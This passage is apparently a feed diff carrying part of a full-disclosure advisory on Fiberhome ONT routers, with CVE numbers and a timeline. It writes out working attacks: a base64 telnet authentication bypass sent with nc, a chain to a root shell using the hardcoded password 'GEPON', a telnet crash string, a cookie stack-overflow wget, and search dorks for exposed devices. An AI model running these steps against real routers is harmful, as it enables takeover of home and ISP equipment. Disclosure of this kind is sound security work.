+Please use port 26 to telnet
+</code></pre>
+<p><code>shell</code> and <code>tshell</code> will call the function <code>enter_telnet_shell()</code> from <code>libcli_cli.so</code>, running <code>system("telnet -p 26")</code>.
+This telneld will then use hardcoded credentials.</p>
+<p><img alt="" src="images/2021-fiberhome-enter_telnet_shell.png" />
+<center>Pseudo-code of <code>enter_telnet_shell()</code></center></p>
+<p>Surprisingly, there is another function called <code>enter_tshell</code> (for a legacy <code>tshell</code>) which will run a <code>system("sh")</code> as root.</p>
+<p>This function <code>enter_tshell()</code> providing a rootshell is not being called from <code>shell</code> so this looks like dead code:</p>
+<p><img alt="" src="images/2021-fiberhome-enter_tshell.png" />
+<center>Pseudo-code of <code>enter_tshell()</code></center></p>
+<p><a id="telnet-cli-auth-bypass"></a></p>
+<h2>Details - Telnet server (CLI) - Authentication bypass</h2>
+<p>It is possible to bypass telnet authentication by sending a specific string to the remote telnet server:</p>
+<pre><code>$ echo 'GgpoZWxwCmxpc3QKd2hvCg==' | base64 -d &gt; bypass-auth-telnet
+$ hexdump -C bypass-auth-telnet
+00000000  1a 0a 68 65 6c 70 0a 6c  69 73 74 0a 77 68 6f 0a  |..help.list.who.|
+00000010
+$ nc 192.168.1.1 23 &lt; bypass-auth-telnet
+
+------acl IP:192.168.1.2 --------
+Login: 
+User&gt; 
+User&gt; help
+
+      This system provides help feature as described below.
+
+      1. Anytime you need help, just press "?" and don't
+  press Enter,you can see each possible command argument
+  and its description.
+
+      2. You can also input "list" and then press Enter
+  to execute this helpful command to view the list of
+  commands you can use.
+
+User&gt; list
+ 0. clear
+ 1. enable
+ 2. exit
+ 3. help
+ 4. list
+ 5. ping {[-t]}*1 {[-count] &lt;1-65535&gt;}*1 {[-size] &lt;1-6400&gt;}*1 {[-waittime] &lt;1-255&gt;}*1 {[-ttl] &lt;1-255&gt;}*1 {[-pattern] &lt;user_pattern&gt;}*1 {[-i] &lt;A.B.C.C&gt;}*1 &lt;A.B.C.D&gt; 
+ 6. quit
+ 7. show history
+ 8. show idle-timeout
+ 9. show ip
+10. show services
+11. show syscontact
+12. show syslocation
+13. terminal length &lt;0-512&gt;
+14. who
+15. who am i
+User&gt; who
+SessionID. - UserName ---------- LOCATION ---------- MODE ---- 
+7            not login           192.168.1.2         not login (That's me.)
+Total 1 sessions in current system. 
+User&gt;
+</code></pre>
+<p><a id="telnet-cli-auth-bypass-linux-telnetd"></a></p>
+<h2>Details - Telnet server (CLI) - Authentication bypass to start the Linux telnetd</h2>
+<p>It is possible to use the previous authentication bypass to start a full telnetd server on port 26 and then get a root shell using the password from <a href="#telnet-linux-hardcoded-credentials">Telnet server (Linux) - Hardcoded credentials</a>.</p>
+<p>By sending <code>ddd</code> then <code>tshell</code>, a telnetd will be started on port 26/tcp:</p>
+<pre><code>$ echo GgpoZWxwCmxpc3QKd2hvCmRkZAp0c2hlbGwK | base64 -d | nc target 23 &amp;
+------acl IP:192.168.1.2 --------
+Login: 
+User&gt; 
+User&gt; help
+
+      This system provides help feature as described below.
+
+      1. Anytime you need help, just press "?" and don't
+  press Enter,you can see each possible command argument
+  and its description.
+
+      2. You can also input "list" and then press Enter
+  to execute this helpful command to view the list of
+  commands you can use.
+
+User&gt; list
+ 0. clear
+ 1. enable
+ 2. exit
+ 3. help
+
+
+
+$ telnet target 26
+Trying target...
+Connected to target.
+Escape character is '^]'.
+
+(none) login: root
+Password: [GEPON]
+
+
+BusyBox v1.27.2 (2019-04-01 19:16:06 CST) built-in shell (ash)
+Enter 'help' for a list of built-in commands.
+
+#id
+uid=0(root) gid=0 groups=0
+</code></pre>
+<p>The attacker will get a root shell.</p>
+<p><a id="telnet-cli-dos"></a></p>
+<h2>Details - Telnet server (CLI) - DoS</h2>
+<p>It is possible to crash the telnet daemon by sending a specific string:</p>
+<pre><code>$ hexdump -C crash-auth-telnet 
+00000000  1a 0a 65 6e 61 62 6c 65  0a 02 0a 1a 0a           |..enable.....|
+0000000d
+$ nc -v 192.168.1.1 23 &lt; crash-auth-telnet 
+192.168.1.1: inverse host lookup failed: Host name lookup failure
+(UNKNOWN) [192.168.1.1] 23 (telnet) open
+$ nc -v 192.168.1.1 23 &lt; crash-auth-telnet 
+192.168.1.1: inverse host lookup failed: Host name lookup failure
+(UNKNOWN) [192.168.1.1] 23 (telnet) : Connection refused
+</code></pre>
+<p>This segfault exists inside <code>/fh/extend/load_cli</code> but was not studied as the previous bypass already worked.</p>
+<p><a id="system-credentials-clear-text-files"></a></p>
+<h2>Details - System - Credentials stored in clear-text</h2>
+<p>Some credentials are stored in clear-text with permissive rights:</p>
+<pre><code>#pwd
+/fhconf/fh_wifi
+#ls -la 
+drwxr-xr-x    2 root     0              536 Jan  7  2020 .
+drwxr-xr-x   14 root     0            10264 Jan  8 15:29 ..
+-rw-r--r--    1 root     0              118 Jan  1  1970 wifi_custom.cfg
+-rw-r--r--    1 root     0             1212 Jan  7  2020 wifictl_2g.cfg
+-rw-r--r--    1 root     0             1178 Jan  7  2020 wifictl_2g.cfg.bak
+-rw-r--r--    1 root     0             1213 Jan  7  2020 wifictl_5g.cfg
+-rw-r--r--    1 root     0             1208 Jan  7  2020 wifictl_5g.cfg.bak
+
+#cat /fhconf/fh_wifi/wifi_custom.cfg 
+ssid_2g=[REMOVED]
+ssid_5g=[REMOVED]
+country=BR
+auth=WPAPSKWPA2PSK
+encrypt=tkipaes
+psk=[REMOVED]
+#
+
+#cat wifictl_2g.cfg
+[...]
+WPAPSK=[REMOVED]
+[...]
+WEPKey1=[REMOVED]
+[...]
+WEPKey2=[REMOVED]
+[...]
+WEPKey3=[REMOVED]
+[...]
+WEPKey4=[REMOVED]
+[...]
+RadiusKey=[REMOVED]
+
+#cat wifictl_5g.cfg
+SSID=[REMOVED]
+[...]
+WPAPSK=[REMOVED]
+[...]
+WEPKey1=[REMOVED]
+[...]
+WEPKey2=[REMOVED]
+[...]
+WEPKey3=[REMOVED]
+[...]
+WEPKey4=[REMOVED]
+[...]
+RadiusKey=[REMOVED]
+</code></pre>
+<p><a id="system-credentials-clear-text-nvram"></a></p>
+<h2>Details - Misc - Passwords stored in clear-text in nvram</h2>
+<p>Some passwords are stored in clear-text in nvram:</p>
+<pre><code>#nvram show
+wl0.1_key=1
+wl0.1_key1=[REMOVED]
+wl0.1_key2=[REMOVED]
+wl0.1_key3=[REMOVED]
+wl0.1_key4=[REMOVED]
+[...]
+wl0.1_ssid=[REMOVED]
+[...]
+wl0.1_wpa_psk=[REMOVED]
+[...]
+wl0_key1=[REMOVED]
+wl0_key2=[REMOVED]
+wl0_key3=[REMOVED]
+wl0_key4=[REMOVED]
+[...]
+wl0_ssid=[REMOVED]
+[...]
+wl0_wpa_psk=[REMOVED]
+[...]
+[ passwords everywhere removed because of space ]
+[...]
+</code></pre>
+<p><a id="misc-remote-stack-overflow-an5506"></a></p>
+<h2>Details - Misc - Remote stack overflow in the HTTP server (AN5506-04-FA / RP2631)</h2>
+<p>I got another Fiberhome device with a different firmware version (AN5506-04-FA, firmware RP2631, 4 April 2019). The HG6245D and the AN5506-04-FA devices share a very similar code base.</p>
+<p>The firmware on the AN5506-04-FA device is vulnerable to a remote stack overflow in the <code>webs</code> process by sending a Cookie value with a length &gt; 511 bytes to any valid asp webpage. This can be triggered using a simple wget command:</p>
+<pre><code>$ wget --no-check-certificate -O- --header 'Cookie: loginName=AAAA[511bytes]AAAA' https://192.168.1.1/tr069/tr069.asp
+</code></pre>
+<p>In the HG6245D firmware version RP2602, this vulnerability has been patched by checking the size of values in the cookies, so I was not able to exploit it. You can also read the log file to confirm the length is now checked:</p>
+<pre><code>&lt;web_ga&gt;2020-01-08 21:23:12,../thd_ga2_5/webs.c[1375](websParseRequest): Request header param value is too long! key: cookie
+</code></pre>
+<p>It appears it has been patched in the HG6245D router, firmware RP2602. Firmware RP2631 (4 April 2019) for router AN5506-04-FA remains vulnerable.
+I found no CVE or public research about this vulnerability so it may have been silently patched by the vendor for the HG6245D router.</p>
+<h2>Dorks</h2>
+<p><code>acl IP:</code></p>
+<p><code>GoAhead-Webs/2.5.0 PeerSec-MatrixSSL/3.4.2-OPEN</code></p>
+<h2>Vendor Response</h2>
+<p>Full-disclosure is applied as it is believed that some backdoors have been intentionally placed by the vendor.</p>
+<h2>Report Timeline</h2>
+<ul>
+<li>Jan 7, 2020: Majority of vulnerabilities found.</li>
+<li>Jan 8, 2020: This advisory was written.</li>
+<li>Aug 2020: Found the lack of IPv6 firewall.</li>
+<li>Jan 9, 2021: Vulnerabilities checked again and the advisory was rewritten.</li>
+<li>Jan 12, 2021: A public advisory is sent to security mailing lists.</li>
+<li>Feb 7, 2021: The latest firmware version (RP2613) is confirmed to be vulnerable.</li>
+<li>Feb 10, 2021: MITRE provides CVE-2021-27139, CVE-2021-27140, CVE-2021-27141, CVE-2021-27142, CVE-2021-27143, CVE-2021-27144, CVE-2021-27145, CVE-2021-27146, CVE-2021-27147, CVE-2021-27148, CVE-2021-27149, CVE-2021-27150, CVE-2021-27151, CVE-2021-27152, CVE-2021-27153, CVE-2021-27154, CVE-2021-27155, CVE-2021-27156, CVE-2021-27157, CVE-2021-27158, CVE-2021-27159, CVE-2021-27160, CVE-2021-27161, CVE-2021-27162, CVE-2021-27163, CVE-2021-27164, CVE-2021-27165, CVE-2021-27166, CVE-2021-27167, CVE-2021-27168, CVE-2021-27169, CVE-2021-27170, CVE-2021-27171, CVE-2021-27172, CVE-2021-27173, CVE-2021-27174, CVE-2021-27175, CVE-2021-27176, CVE-2021-27177, CVE-2021-27178, CVE-2021-27179.</li>
+</ul>
+<h2>Credits</h2>
+<p>These vulnerabilities were found by Pierre Kim (<a href="https://twitter.com/PierreKimSec">@PierreKimSec</a>).</p>
+<h2>References</h2>
+<p><a href="//pierrekim.github.io/advisories/2021-fiberhome-0x00-ont.txt">https://pierrekim.github.io/advisories/2021-fiberhome-0x00-ont.txt</a></p>
+<p><a href="https://pierrekim.github.io/blog/2021-01-12-fiberhome-ont-0day-vulnerabilities.html">https://pierrekim.github.io/blog/2021-01-12-fiberhome-ont-0day-vulnerabilities.html</a></p>
+<h2>Disclaimer</h2>
+<p>This advisory is licensed under a Creative Commons Attribution Non-Commercial
+Share-Alike 3.0 License: <a href="http://creativecommons.org/licenses/by-nc-sa/3.0/">http://creativecommons.org/licenses/by-nc-sa/3.0/</a></p></content>
+    </entry>
+    
+    <entry>
         <title>Multiple vulnerabilities found in CDATA OLTs</title>
         <link href="2020-07-07-cdata-olt-0day-vulnerabilities.html"/>
         <content type="html"><h2>Product Description</h2>
